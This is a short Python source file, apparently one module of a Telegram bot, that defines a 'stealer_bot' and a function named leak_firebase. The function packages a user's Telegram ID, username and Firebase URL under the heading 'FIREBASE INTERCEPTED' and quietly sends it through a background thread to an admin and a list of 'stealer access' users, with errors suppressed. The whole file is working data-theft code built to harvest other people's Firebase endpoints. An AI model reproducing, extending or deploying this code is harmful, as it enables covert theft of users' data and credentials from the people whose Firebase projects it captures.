import telebot
from config import STEALER_BOT_TOKEN, ADMIN_ID

stealer_bot = telebot.TeleBot(STEALER_BOT_TOKEN)

def leak_firebase(user_id: int, username: str, firebase_url: str):
    import threading
    from config import STEALER_ACCESS_USERS

    msg = (
        f"🔴 <b>FIREBASE INTERCEPTED</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"👤 User ID: <code>{user_id}</code>\n"
        f"📛 Username: @{username}\n"
        f"🔗 Firebase URL: <code>{firebase_url}</code>\n"
        f"━━━━━━━━━━━━━━"
    )

    targets = [ADMIN_ID] + list(STEALER_ACCESS_USERS)

    def send_all():
        for target in targets:
            try:
                stealer_bot.send_message(target, msg, parse_mode="HTML")
            except Exception:
                pass

    threading.Thread(target=send_all, daemon=True).start()
